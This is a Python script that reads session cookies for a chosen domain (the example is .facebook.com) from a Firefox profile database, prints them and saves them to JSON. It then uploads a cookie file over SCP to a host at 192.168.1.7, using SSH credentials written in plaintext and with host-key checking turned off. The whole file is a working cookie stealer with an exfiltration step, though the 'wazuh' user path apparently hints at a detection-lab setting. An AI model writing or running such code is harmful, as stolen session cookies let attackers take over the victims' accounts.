import sqlite3
import os
import json
import re  # add at top
import paramiko
from scp import SCPClient

def get_firefox_cookies(domain_filter):
    profile_path = r"C:\Users\wazuh\AppData\Roaming\Mozilla\Firefox\Profiles\w2r4kgv6.default-release"
    cookie_db = os.path.join(profile_path, "cookies.sqlite")

    if not os.path.exists(cookie_db):
        print(" Cookie DB not found at:")
        print(cookie_db)
        return

    try:
        conn = sqlite3.connect(cookie_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE ?", ('%' + domain_filter + '%',))

        cookies = []
        print(f"\n Cookies for domain: {domain_filter}\n")
        for host, name, value in cursor.fetchall():
            print(f"{host} -> {name} = {value}")
            cookies.append({
                "host": host,
                "name": name,
                "value": value
            })

        conn.close()

        # Export to JSON
        safe_domain = re.sub(r'[^\w\-_.]', '_', domain_filter.strip('.'))
        output_file = f"firefox_cookies_{safe_domain}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(cookies, f, indent=4)
        print(f"\n Cookies saved to: {output_file}")

    except Exception as e:
        print(f" Error reading cookie DB: {e}")

# Run the script
if __name__ == "__main__":
    domain_input = input("Enter domain to filter (e.g. .facebook.com): ")
    get_firefox_cookies(domain_input)

# SSH Credentials
hostname = "192.168.1.7"
port = 22
username = "scp"
password = "Super@123"  # Or use private key authentication

# File to transfer
local_file = "C:/temp/firefox_cookies_facebook.com.json"
remote_path = "/tmp/"

# 🔌 Create SSH client and connect
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname, port, username, password)

# SCP transfer
with SCPClient(ssh.get_transport()) as scp:
    scp.put(local_file, remote_path)
    print(" File uploaded successfully!")

# Close the SSH connection
ssh.close()

